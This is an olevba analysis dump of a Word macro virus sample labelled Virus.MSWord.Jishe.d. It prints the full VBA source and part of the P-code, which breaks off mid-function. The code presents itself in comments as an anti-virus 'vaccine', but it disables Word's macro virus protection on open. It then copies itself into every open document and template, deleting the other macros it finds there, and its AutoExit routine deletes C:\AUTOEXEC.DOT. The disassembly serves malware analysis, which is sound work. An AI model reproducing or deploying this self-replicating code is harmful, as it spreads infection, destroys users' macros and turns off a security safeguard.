olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jishe.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jishe.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'这是本人学习制作的一个宏病毒防杀程序,它可以防止部分WORD宏病毒的感染
'这需要有大量的宏病毒特征码作为依据,如果你发现有本疫苗无能为力的宏病毒
'感谢您及时与我联系,你也可以自选修改本程序,以加强本疫苗的功力
'与病毒作斗争就如同抵御社会犯罪,需要大家的共同努力
'欢迎加入其中并成为一名战士,也许你正是大家期待已久的勇士
'程序设计: 冀慎华
'办公电话:
'伊妹地址: club@263.net
Option Explicit '程序中的变量必须先定义后使用
Const answer0 = "FreeWordMacroVirusKiller" '保持与以前版本的兼容性
Const answer1 = "MyMacroVirusKillerV1.0"
Const answer2 = "MyMacroVirusKillerV2.0"
Const answer3 = "MyMacroVirusKillerV2.2" '本程序标志
'Version 2.0
Private Sub Document_Open()
    CloseVirusProtection
    '检查打开的文档中是否有病毒
    If ScanVirus Then
        Load VirusReport
        VirusReport.Show
    Else
        InfectAll
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO JiShenhua.bas 
in file: Virus.MSWord.Jishe.d - OLE stream: 'Macros/VBA/JiShenhua'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'这是本人学习制作的一个宏病毒防杀程序,它可以防止部分WORD宏病毒的感染
'这需要有大量的宏病毒特征码作为依据,如果你发现有本疫苗无能为力的宏病毒
'感谢您及时与我联系,你也可以自选修改本程序,以加强本疫苗的功力
'与病毒作斗争就如同抵御社会犯罪,需要大家的共同努力
'欢迎加入其中并成为一名战士,也许你正是大家期待已久的勇士
'程序设计: 冀慎华
'办公电话:
'伊妹地址: club@263.net
Option Explicit '程序中的变量必须先定义后使用
Public pVirusReport As String '病毒描述信息
Private Const cMyID As String = "MyMacroVirusKiller" '本程序代码标志
Private Const cMyVersion As String = "V2.2" '本程序版本标准
Private Const cMyModule As String = "JiShenhua" '本程序的模块名称
Private Const cMyUserForm As String = "VirusReport" '本程序的用户窗口名称
Private Const cLinesofThisDocument As Integer = 25 '在ThisDocument模块中全部代码的行数
Private Const cOK As Integer = 0 '一切正常
Private Const cDocHasModuleElse As Integer = 1 '有其他模块存在
Private Const cDocHasCodeElse As Integer = 2 '在ThisDocument模块中有其他代码存在
Private Const cDocHasAllElse As Integer = 3 '在ThisDocument模块中有其他代码存在，并有其他模块存在
Private Const cDocProtected As Integer = 4 '该文档被保护
Public Const cDocHasOldVersion As Integer = 8  '该文档中有旧版本该杀病毒模块
'打开文档时自动执行
Sub AutoOpen()
    CloseVirusProtection
    '检查打开的文档中是否有病毒,如果有病毒，向用户提出报告
    If ScanVirus Then
        Load VirusReport
        VirusReport.Show
    Else
        InfectAll
    End If
End Sub
'新建文档时自动执行
Sub AutoNew()
    CloseVirusProtection
    Infect Word.ActiveDocument
End Sub
'关闭WORD之前清理autoexec.dot文件中的病毒
Sub AutoExit()
    Const AutoDotFile = "C:\AUTOEXEC.DOT"
    If Dir(AutoDotFile) <> "" Then
        Kill AutoDotFile
    End If
End Sub
'从指定文件中向所有打开文档及模板中复制本程序代码及模块
Public Function InfectAll() As Boolean
    Dim myDoc As Document, myTemp As Template
    '向打开的文档中写入本代码
    For Each myDoc In Documents
        Infect myDoc
    Next myDoc
    '向WORD模板中写入本代码
    For Each myTemp In Templates
        Infect myTemp
    Next myTemp
    InfectAll = True
End Function
'清除所有打开文档及模板中的病毒模块及代码
Public Function ClearVirus() As Boolean
    Dim i As Integer
    Dim myDoc As Document, myTemp As Template
    Dim Cleared As Boolean
    
    ClearVirus = True
    '检查所有文档并清除
    For Each myDoc In Documents
        Cleared = ClearDocument(myDoc)
        If Not Cleared Then
            MsgBox "病毒清除工作不成功，请检查原因。", vbOKOnly, myDoc.Name
            ClearVirus = False
        End If
    Next myDoc
    '检查所有模板并清除
    For Each myTemp In Templates
        Cleared = ClearDocument(myTemp)
        If Not Cleared Then
            MsgBox "病毒清除工作不成功，请检查原因。", vbOKOnly, myTemp.Name
            ClearVirus = False
        End If
    Next myTemp
End Function
'检查所有打开的文档及模板中是否有病毒存在，如果有，返回病毒信息描述字符串
Public Function ScanVirus() As Boolean
    Dim DocsCount As Integer, i As Integer, ret As Integer
    Dim myStr As String
    Dim myDoc As Document, myTemp As Template
    
    ScanVirus = 0
    pVirusReport = ""
    '检查所有打开的文档中是否有病毒
    For Each myDoc In Documents
        ret = ScanDocument(myDoc)
        Select Case ret
            Case cOK, cDocProtected, cDocHasOldVersion
            Case cDocHasModuleElse, cDocHasCodeElse, cDocHasAllElse
                ScanVirus = True
            Case Else
                MsgBox "函数ScanDocument返回错误代码，系统无法识别。", vbOKOnly, "系统出错"
        End Select
    Next myDoc
    '检查所有模板
    For Each myTemp In Templates
        ret = ScanDocument(myTemp)
        Select Case ret
            Case cOK, cDocProtected, cDocHasOldVersion
            Case cDocHasModuleElse, cDocHasCodeElse, cDocHasAllElse
                ScanVirus = True
            Case Else
                MsgBox "函数ScanDocument返回错误代码，系统无法识别。", vbOKOnly, "系统出错"
        End Select
    Next myTemp
End Function
'把本程序代码从一个文件复制到另一个文件中
Private Function Infect(TargetFile) As Boolean
    Dim xItem, CommandStr As String, file As String
    Dim myDoc As Document, myTemp As Template
    Dim LinesofCode As Long, myStr As String
    
    '检查参数类型是否正确
    myStr = TypeName(TargetFile)
    If myStr <> "Document" And myStr <> "Template" Then
        MsgBox "使用数据类型" + myStr + "调用函数Infect，系统只允许使用Document及Template类型。", vbOKOnly, "系统错误"
        Infect = False
        Exit Function
    End If
    Infect = True
    If TargetFile.Name = ThisDocument.Name Then Exit Function '目标文件与源文件相同时不执行写入操作
    If Infected(TargetFile) Then Exit Function '目标文件已经存在本程序代码
    If TargetFile.VBProject.Protection Then Exit Function '目标文件被保护，不能执行写入操作
    Infect = False
    
    '清除目标文档中已经存在的其他模块及代码
    For Each xItem In TargetFile.VBProject.VBComponents
        If xItem.Name = "ThisDocument" Then
            LinesofCode = xItem.codemodule.CountOfLines
            If LinesofCode > 0 Then xItem.codemodule.DeleteLines 1, LinesofCode
        Else
            TargetFile.VBProject.VBComponents.Remove xItem
        End If
    Next xItem
    
    '向文档中写入本程序代码及模块
    WordBasic.macrocopy ThisDocument.FullName + ":" + cMyModule, TargetFile.FullName + ":" + cMyModule
    WordBasic.macrocopy ThisDocument.FullName + ":" + cMyUserForm, TargetFile.FullName + ":" + cMyUserForm

    ' ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^  ^o^ ^o^
    
    '该程序段如果放在前两个语句之前，就会导致VBA32.DLL程序出现致命错误而死机，
    '穷我之毕生编程经验，不知何故，天哪！天理何在？
    
    LinesofCode = ThisDocument.VBProject.VBComponents(1).codemodule.CountOfLines
    myStr = ThisDocument.VBProject.VBComponents(1).codemodule.lines(1, LinesofCode)
    TargetFile.VBProject.VBComponents(1).codemodule.InsertLines 1, myStr
    
    Infect = True
End Function
'检查指定文档中是否已经有本程序代码
Private Function Infected(TargetFile)
    Dim xItem, LinesofCode As Integer
    Dim BeInfected As Integer
    Dim myType As String, NewVersion As String
    
    myType = TypeName(TargetFile)
    If myType <> "Document" And myType <> "Template" Then
        MsgBox "使用数据类型" + myType + "调用函数Infected，系统只允许使用Document及Template类型。", vbOKOnly, "系统错误"
        Infected = True
        Exit Function
    End If
    
    '检查目标文档是否被保护
    If TargetFile.VBProject.Protection Then
        Infected = True
        Exit Function
    End If
    
    '当ThisDocument,myModule,myUserForm均存在时，表示该文件已经被感染
    BeInfected = 0
    NewVersion = cMyID & cMyVersion
    For Each xItem In TargetFile.VBProject.VBComponents
        If xItem.Name = "ThisDocument" Then
            LinesofCode = xItem.codemodule.CountOfLines
            If (LinesofCode > 0) And (xItem.codemodule.Find(NewVersion, 1, 1, 1 + LinesofCode, 1)) Then
                BeInfected = BeInfected Or 1
            End If
        ElseIf xItem.Name = cMyModule Then
            BeInfected = BeInfected Or 2
        ElseIf xItem.Name = cMyUserForm Then
            BeInfected = BeInfected Or 4
        End If
    Next xItem
    If BeInfected = 7 Then
        Infected = True
    Else
        Infected = False
    End If
End Function
'检查指定的打开文档及模板中是否有病毒存在
Private Function ScanDocument(myDocOrTemp) As Integer
    Dim xItem, i As Integer, myStr As String
    Dim LinesofCode As Integer, NewVersion As String
    
    ScanDocument = cOK
    NewVersion = cMyID & cMyVersion
    '检查参数类型是否正确
    If TypeName(myDocOrTemp) <> "Document" And TypeName(myDocOrTemp) <> "Template" Then
        MsgBox "调用函数ScanDocument只能使用Document及Template数据类型。", vbOKOnly, "系统错误"
        Exit Function
    End If
    myStr = myDocOrTemp.Name + "检查结果：" + vbCrLf
    '检查程序模块是否被保护
    If myDocOrTemp.VBProject.Protection Then
        ScanDocument = cDocProtected
        myStr = myStr + "  文件中的程序代码被保护，系统无法自动查杀，但也可能存在病毒，请小心！" + vbCrLf
        Exit Function
    End If
    For Each xItem In myDocOrTemp.VBProject.VBComponents
        If (xItem.Name = "ThisDocument") Then
            '此部分有代码时，如果总行数超出了规定的行数或者找不到本模块标志则认定为病毒
            LinesofCode = xItem.codemodule.CountOfLines
            If LinesofCode > 0 Then
                If (LinesofCode > cLinesofThisDocument) Then
                    ScanDocument = ScanDocument Or cDocHasCodeElse
                    myStr = myStr + "  <" + xItem.Name + ">对象中有其他程序存在，大概是病毒。" + vbCrLf
                ElseIf Not xItem.codemodule.Find(NewVersion, 1, 1, 1 + LinesofCode, 1) Then '查找是否有新版本存在
                    If xItem.codemodule.Find(cMyID, 1, 1, 1 + LinesofCode, 1) Then '查找是否有旧版本存在
                        ScanDocument = cDocHasOldVersion
                    Else
                        ScanDocument = ScanDocument Or cDocHasCodeElse
                        myStr = myStr + "  <" + xItem.Name + ">对象中有其他程序存在，大概是病毒。" + vbCrLf
                    End If
                End If
            End If
        ElseIf (xItem.Name <> cMyModule) And (xItem.Name <> cMyUserForm) Then
            '文档中除本模块代码之外，如果还有其它代码则认定为病毒
            ScanDocument = ScanDocument Or cDocHasModuleElse
            myStr = myStr + "  有其他模块<" + xItem.Name + ">存在，极有可能是病毒。" + vbCrLf
        End If
    Next
    If ScanDocument = cOK Then myStr = myStr + "没有病毒，请放心使用。" + vbCrLf
    pVirusReport = pVirusReport + myStr
End Function
'清除指定的打开文档及模板中的病毒模块及代码
Private Function ClearDocument(myDocOrTemp) As Boolean
    Dim xItem, LinesofCode As Integer
    Dim NewVersion As String
    
    ClearDocument = False
    '检查参数类型是否正确
    If TypeName(myDocOrTemp) <> "Document" And TypeName(myDocOrTemp) <> "Template" Then
        MsgBox "调用函数ClearDocument只能使用Document及Template数据类型。", vbOKOnly, "系统错误"
        Exit Function
    End If
    If myDocOrTemp.VBProject.Protection Then
        ClearDocument = True
        Exit Function
    End If
    '检查文档是否有病毒
    NewVersion = cMyID & cDocHasOldVersion
    If ScanDocument(myDocOrTemp) Then
        For Each xItem In myDocOrTemp.VBProject.VBComponents
            If xItem.Name = "ThisDocument" Then
                LinesofCode = xItem.codemodule.CountOfLines
                If (LinesofCode > 0) And (Not xItem.codemodule.Find(NewVersion, 1, 1, 1 + LinesofCode, 1)) Then
                    xItem.codemodule.DeleteLines 1, LinesofCode
                End If
            ElseIf xItem.Name <> cMyModule And xItem.Name <> cMyUserForm Then
                myDocOrTemp.VBProject.VBComponents.Remove xItem
            End If
        Next
    End If
    ClearDocument = True
End Function
'关闭Word宏病毒保护功能
Public Function CloseVirusProtection(Optional Protected As Boolean = False)
    Options.VirusProtection = Protected
End Function

-------------------------------------------------------------------------------
VBA MACRO VirusReport.frm 
in file: Virus.MSWord.Jishe.d - OLE stream: 'Macros/VBA/VirusReport'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

















'窗体程序代码
Option Explicit '程序中的变量必须先定义后使用
'打开窗体时执行的操作
Private Sub UserForm_Initialize()
    CheckBox1.Value = True
    Information.Value = pVirusReport
    Beep
End Sub
'关闭窗体，不作任何处理
Private Sub CommandButtonNothing_Click()
    Dim ret As Integer
    ret = MsgBox("领导，虽然你可能会批评我，但还是要告诉你，这样做是很危险的。" & vbCrLf & "是否真的不做处理，请批示。", vbYesNo + vbDefaultButton2, "再次报告！")
    If ret = vbYes Then
        Unload Me
    End If
End Sub
'打开VisulBasic编辑器
Private Sub CommandButtonOpenVisubasic_Click()
    ShowVisualBasicEditor = True
End Sub
'杀病毒
Private Sub CommandButtonKill_Click()
    If ClearVirus Then
        ResetMenu
        InfectAll
        Unload Me
        MsgBox "按照您的指示，我已经把可能是病毒的东东全部清理完毕，" & vbCrLf & "不过也可能好心办了坏事，那可不要怪我哟。", vbOKOnly, "报告！"
    Else
        MsgBox "不知什么原因，清除病毒工作不成功，请您手工检查或与我联系。", vbOKOnly, "冀慎华向您报告："
        Unload Me
    End If
End Sub
'恢复被病毒更改的菜单项
Private Function ResetMenu()
    Dim mItem, cItem, myKey As KeyBinding
    
    CustomizationContext = NormalTemplate
    'Alt+F8:打开宏对话框
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    'Alt+F11:打开VisualBasic编辑器
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyH)).Clear
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyK)).Clear

    '恢复工具菜单的原始设置
    For Each mItem In CommandBars("Tools").Controls
        mItem.Reset
    Next mItem
    For Each cItem In CommandBars("Visual Basic").Controls
        cItem.Reset
    Next cItem
    For Each cItem In CommandBars
        If cItem.Visible = True Then
            cItem.Protection = msoBarNoProtection
        End If
    Next cItem
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Jishe.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3005 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0043 "这是本人学习制作的一个宏病毒防杀程序,它可以防止部分WORD宏病毒的感染"
' Line #1:
' 	QuoteRem 0x0000 0x0045 "这需要有大量的宏病毒特征码作为依据,如果你发现有本疫苗无能为力的宏病毒"
' Line #2:
' 	QuoteRem 0x0000 0x003C "感谢您及时与我联系,你也可以自选修改本程序,以加强本疫苗的功力"
' Line #3:
' 	QuoteRem 0x0000 0x0031 "与病毒作斗争就如同抵御社会犯罪,需要大家的共同努力"
' Line #4:
' 	QuoteRem 0x0000 0x0037 "欢迎加入其中并成为一名战士,也许你正是大家期待已久的勇士"
' Line #5:
' 	QuoteRem 0x0000 0x0010 "程序设计: 冀慎华"
' Line #6:
' 	QuoteRem 0x0000 0x0009 "办公电话:"
' Line #7:
' 	QuoteRem 0x0000 0x0016 "伊妹地址: club@263.net"
' Line #8:
' 	Option  (Explicit)
' 	QuoteRem 0x0010 0x001C "程序中的变量必须先定义后使用"
' Line #9:
' 	Dim (Const) 
' 	LitStr 0x0018 "FreeWordMacroVirusKiller"
' 	VarDefn answer0
' 	QuoteRem 0x002B 0x0016 "保持与以前版本的兼容性"
' Line #10:
' 	Dim (Const) 
' 	LitStr 0x0016 "MyMacroVirusKillerV1.0"
' 	VarDefn answer1
' Line #11:
' 	Dim (Const) 
' 	LitStr 0x0016 "MyMacroVirusKillerV2.0"
' 	VarDefn answer2
' Line #12:
' 	Dim (Const) 
' 	LitStr 0x0016 "MyMacroVirusKillerV2.2"
' 	VarDefn answer3
' 	QuoteRem 0x0029 0x000A "本程序标志"
' Line #13:
' 	QuoteRem 0x0000 0x000B "Version 2.0"
' Line #14:
' 	FuncDefn (Private Sub Document_Open())
' Line #15:
' 	ArgsCall CloseVirusProtection 0x0000 
' Line #16:
' 	QuoteRem 0x0004 0x001A "检查打开的文档中是否有病毒"
' Line #17:
' 	Ld ScanVirus 
' 	IfBlock 
' Line #18:
' 	Ld VirusReport 
' 	ArgsCall Local 0x0001 
' Line #19:
' 	Ld VirusReport 
' 	ArgsMemCall Show 0x0000 
' Line #20:
' 	ElseBlock 
' Line #21:
' 	ArgsCall InfectAll 0x0000 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	EndSub 
' Macros/VBA/JiShenhua - 17745 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0043 "这是本人学习制作的一个宏病毒防杀程序,它可以防止部分WORD宏病毒的感染"
' Line #1:
' 	QuoteRem 0x0000 0x0045 "这需要有大量的宏病毒特征码作为依据,如果你发现有本疫苗无能为力的宏病毒"
' Line #2:
' 	QuoteRem 0x0000 0x003C "感谢您及时与我联系,你也可以自选修改本程序,以加强本疫苗的功力"
' Line #3:
' 	QuoteRem 0x0000 0x0031 "与病毒作斗争就如同抵御社会犯罪,需要大家的共同努力"
' Line #4:
' 	QuoteRem 0x0000 0x0037 "欢迎加入其中并成为一名战士,也许你正是大家期待已久的勇士"
' Line #5:
' 	QuoteRem 0x0000 0x0010 "程序设计: 冀慎华"
' Line #6:
' 	QuoteRem 0x0000 0x0009 "办公电话:"
' Line #7:
' 	QuoteRem 0x0000 0x0016 "伊妹地址: club@263.net"
' Line #8:
' 	Option  (Explicit)
' 	QuoteRem 0x0010 0x001C "程序中的变量必须先定义后使用"
' Line #9:
' 	Dim (Public) 
' 	VarDefn pVirusReport (As String)
' 	QuoteRem 0x001E 0x000C "病毒描述信息"
' Line #10:
' 	Dim (Private Const) 
' 	LitStr 0x0012 "MyMacroVirusKiller"
' 	VarDefn cMyID (As String)
' 	QuoteRem 0x0035 0x000E "本程序代码标志"
' Line #11:
' 	Dim (Private Const) 
' 	LitStr 0x0004 "V2.2"
' 	VarDefn cMyVersion (As String)
' 	QuoteRem 0x002C 0x000E "本程序版本标准"
' Line #12:
' 	Dim (Private Const) 
' 	LitStr 0x0009 "JiShenhua"
' 	VarDefn cMyModule (As String)
' 	QuoteRem 0x0030 0x0010 "本程序的模块名称"
' Line #13:
' 	Dim (Private Const) 
' 	LitStr 0x000B "VirusReport"
' 	VarDefn cMyUserForm (As String)
' 	QuoteRem 0x0034 0x0014 "本程序的用户窗口名称"
' Line #14:
' 	Dim (Private Const) 
' 	LitDI2 0x0019 
' 	VarDefn cLinesofThisDocument (As Integer)
' 	QuoteRem 0x0033 0x0022 "在ThisDocument模块中全部代码的行数"
' Line #15:
' 	Dim (Private Const) 
' 	LitDI2 0x0000 
' 	VarDefn cOK (As Integer)
' 	QuoteRem 0x0021 0x0008 "一切正常"
' Line #16:
' 	Dim (Private Const) 
' 	LitDI2 0x0001 
' 	VarDefn cDocHasModuleElse (As Integer)
' 	QuoteRem 0x002F 0x000E "有其他模块存在"
' Line #17:
' 	Dim (Private Const) 
' 	LitDI2 0x0002 
' 	VarDefn cDocHasCodeElse (As Integer)
' 	QuoteRem 0x002D 0x0022 "在ThisDocument模块中有其他代码存在"
' Line #18:
' 	Dim (Private Const) 
' 	LitDI2 0x0003 
' 	VarDefn cDocHasAllElse (As Integer)
' 	QuoteRem 0x002C 0x0034 "在ThisDocument模块中有其他代码存在，并有其他模块存在"
' Line #19:
' 	Dim (Private Const) 
' 	LitDI2 0x0004 
' 	VarDefn cDocProtected (As Integer)
' 	QuoteRem 0x002B 0x000C "该文档被保护"
' Line #20:
' 	Dim (Public Const) 
' 	LitDI2 0x0008 
' 	VarDefn cDocHasOldVersion (As Integer)
' 	QuoteRem 0x002F 0x001C "该文档中有旧版本该杀病毒模块"
' Line #21:
' 	QuoteRem 0x0000 0x0012 "打开文档时自动执行"
' Line #22:
' 	FuncDefn (Sub AutoOpen())
' Line #23:
' 	ArgsCall CloseVirusProtection 0x0000 
' Line #24:
' 	QuoteRem 0x0004 0x0035 "检查打开的文档中是否有病毒,如果有病毒，向用户提出报告"
' Line #25:
' 	Ld ScanVirus 
' 	IfBlock 
' Line #26:
' 	Ld VirusReport 
' 	ArgsCall Local 0x0001 
' Line #27:
' 	Ld VirusReport 
' 	ArgsMemCall Show 0x0000 
' Line #28:
' 	ElseBlock 
' Line #29:
' 	ArgsCall InfectAll 0x0000 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	EndSub 
' Line #32:
' 	QuoteRem 0x0000 0x0012 "新建文档时自动执行"
' Line #33:
' 	FuncDefn (Sub AutoNew())
' Line #34:
' 	ArgsCall CloseVirusProtection 0x0000 
' Line #35:
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	ArgsCall Infect 0x0001 
' Line #36:
' 	EndSub 
' Line #37:
' 	QuoteRem 0x0000 0x0028 "关闭WORD之前清理autoexec.dot文件中的病毒"
' Line #38:
' 	FuncDefn (Sub AutoExit())
' Line #39:
' 	Dim (Const) 
' 	LitStr 0x000F "C:\AUTOEXEC.DOT"
' 	VarDefn AutoDotFile
' Line #40:
' 	Ld AutoDotFile 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #41:
' 	Ld AutoDotFile 
' 	ArgsCall Kill 0x0001 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	EndSub 
' Line #44:
' 	QuoteRem 0x0000 0x0036 "从指定文件中向所有打开文档及模板中复制本程序代码及模块"
' Line #45:
' 	FuncDefn (Public Function InfectAll() As Boolean)
' Line #46:
' 	Dim 
' 	VarDefn myDoc
' 	VarDefn myTemp (As Template)
' Line #47:
' 	QuoteRem 0x0004 0x0018 "向打开的文档中写入本代码"
' Line #48:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #49:
' 	Ld myDoc 
' 	ArgsCall Infect 0x0001 
' Line #50:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' 	QuoteRem 0x0004 0x0016 "向WORD模板中写入本代码"
' Line #52:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #53:
' 	Ld myTemp 
' 	ArgsCall Infect 0x0001 
' Line #54:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	LitVarSpecial (True)
' 	St InfectAll 
' Line #56:
' 	EndFunc 
' Line #57:
' 	QuoteRem 0x0000 0x0028 "清除所有打开文档及模板中的病毒模块及代码"
' Line #58:
' 	FuncDefn (Public Function ClearVirus() As Boolean)
' Line #59:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #60:
' 	Dim 
' 	VarDefn myDoc
' 	VarDefn myTemp (As Template)
' Line #61:
' 	Dim 
' 	VarDefn Cleared (As Boolean)
' Line #62:
' Line #63:
' 	LitVarSpecial (True)
' 	St ClearVirus 
' Line #64:
' 	QuoteRem 0x0004 0x0012 "检查所有文档并清除"
' Line #65:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #66:
' 	Ld myDoc 
' 	ArgsLd ClearDocument 0x0001 
' 	St Cleared 
' Line #67:
' 	Ld Cleared 
' 	Not 
' 	IfBlock 
' Line #68:
' 	LitStr 0x0020 "病毒清除工作不成功，请检查原因。"
' 	Ld vbOKOnly 
' 	Ld myDoc 
' 	MemLd New 
' 	ArgsCall MsgBox 0x0003 
' Line #69:
' 	LitVarSpecial (False)
' 	St ClearVirus 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	NextVar 
' Line #72:
' 	QuoteRem 0x0004 0x0012 "检查所有模板并清除"
' Line #73:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #74:
' 	Ld myTemp 
' 	ArgsLd ClearDocument 0x0001 
' 	St Cleared 
' Line #75:
' 	Ld Cleared 
' 	Not 
' 	IfBlock 
' Line #76:
' 	LitStr 0x0020 "病毒清除工作不成功，请检查原因。"
' 	Ld vbOKOnly 
' 	Ld myTemp 
' 	MemLd New 
' 	ArgsCall MsgBox 0x0003 
' Line #77:
' 	LitVarSpecial (False)
' 	St ClearVirus 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	NextVar 
' Line #80:
' 	EndFunc 
' Line #81:
' 	QuoteRem 0x0000 0x0048 "检查所有打开的文档及模板中是否有病毒存在，如果有，返回病毒信息描述字符串"
' Line #82:
' 	FuncDefn (Public Function ScanVirus() As Boolean)
' Line #83:
' 	Dim 
' 	VarDefn DocsCount (As Integer)
' 	VarDefn i (As Integer)
' 	VarDefn ret (As Integer)
' Line #84:
' 	Dim 
' 	VarDefn myStr (As String)
' Line #85:
' 	Dim 
' 	VarDefn myDoc
' 	VarDefn myTemp (As Template)
' Line #86:
' Line #87:
' 	LitDI2 0x0000 
' 	St ScanVirus 
' Line #88:
' 	LitStr 0x0000 ""
' 	St pVirusReport 
' Line #89:
' 	QuoteRem 0x0004 0x001E "检查所有打开的文档中是否有病毒"
' Line #90:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #91:
' 	Ld myDoc 
' 	ArgsLd ScanDocument 0x0001 
' 	St ret 
' Line #92:
' 	Ld ret 
' 	SelectCase 
' Line #93:
' 	Ld cOK 
' 	Case 
' 	Ld cDocProtected 
' 	Case 
' 	Ld cDocHasOldVersion 
' 	Case 
' 	CaseDone 
' Line #94:
' 	Ld cDocHasModuleElse 
' 	Case 
' 	Ld cDocHasCodeElse 
' 	Case 
' 	Ld cDocHasAllElse 
' 	Case 
' 	CaseDone 
' Line #95:
' 	LitVarSpecial (True)
' 	St ScanVirus 
' Line #96:
' 	CaseElse 
' Line #97:
' 	LitStr 0x002C "函数ScanDocument返回错误代码，系统无法识别。"
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "系统出错"
' 	ArgsCall MsgBox 0x0003 
' Line #98:
' 	EndSelect 
' Line #99:
' 	StartForVariable 
' 	Ld myDoc 
' 	EndForVariable 
' 	NextVar 
' Line #100:
' 	QuoteRem 0x0004 0x000C "检查所有模板"
' Line #101:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	Ld Templates 
' 	ForEach 
' Line #102:
' 	Ld myTemp 
' 	ArgsLd ScanDocument 0x0001 
' 	St ret 
' Line #103:
' 	Ld ret 
' 	SelectCase 
' Line #104:
' 	Ld cOK 
' 	Case 
' 	Ld cDocProtected 
' 	Case 
' 	Ld cDocHasOldVersion 
' 	Case 
' 	CaseDone 
' Line #105:
' 	Ld cDocHasModuleElse 
' 	Case 
' 	Ld cDocHasCodeElse 
' 	Case 
' 	Ld cDocHasAllElse 
' 	Case 
' 	CaseDone 
' Line #106:
' 	LitVarSpecial (True)
' 	St ScanVirus 
' Line #107:
' 	CaseElse 
' Line #108:
' 	LitStr 0x002C "函数ScanDocument返回错误代码，系统无法识别。"
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "系统出错"
' 	ArgsCall MsgBox 0x0003 
' Line #109:
' 	EndSelect 
' Line #110:
' 	StartForVariable 
' 	Ld myTemp 
' 	EndForVariable 
' 	NextVar 
' Line #111:
' 	EndFunc 
' Line #112:
' 	QuoteRem 0x0000 0x0028 "把本程序代码从一个文件复制到另一个文件中"
' Line #113:
' 	FuncDefn (Private Function Infect(TargetFile) As Boolean)
' Line #114:
' 	Dim 
' 	VarDefn xItem
' 	VarDefn CommandStr (As String)
' 	VarDefn file (As String)
' Line #115:
' 	Dim 
' 	VarDefn myDoc
' 	VarDefn myTemp (As Template)
' Line #116:
' 	Dim 
' 	VarDefn LinesofCode (As Long)
' 	VarDefn myStr (As String)
' Line #117:
' Line #118:
' 	QuoteRem 0x0004 0x0014 "检查参数类型是否正确"
' Line #119:
' 	Ld TargetFile 
' 	ArgsLd TypeName 0x0001 
' 	St myStr 
' Line #120:
' 	Ld myStr 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Ld myStr 
' 	LitStr 0x0008 "Template"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #121:
' 	LitStr 0x000C "使用数据类型"
' 	Ld myStr 
' 	Add 
' 	LitStr 0x0036 "调用函数Infect，系统只允许使用Document及Template类型。"
' 	Add 
' 	Ld vbOKOnly 
' 	LitStr 0x0008 "系统错误"
' 	ArgsCall MsgBox 0x0003 
' Line #122:
' 	LitVarSpecial (False)
' 	St Infect 
' Line #123:
' 	ExitFunc 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	LitVarSpecial (True)
' 	St Infect 
' Line #126:
' 	Ld TargetFile 
' 	MemLd New 
' 	Ld ThisDocument 
' 	MemLd New 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' 	QuoteRem 0x003E 0x0024 "目标文件与源文件相同时不执行写入操作"
' Line #127:
' 	Ld TargetFile 
' 	ArgsLd Infected 0x0001 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' 	QuoteRem 0x002F 0x001A "目标文件已经存在本程序代码"
' Line #128:
' 	Ld TargetFile 
' 	MemLd VBProject 
' 	MemLd Protection 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' 	QuoteRem 0x003A 0x0020 "目标文件被保护，不能执行写入操作"
' Line #129:
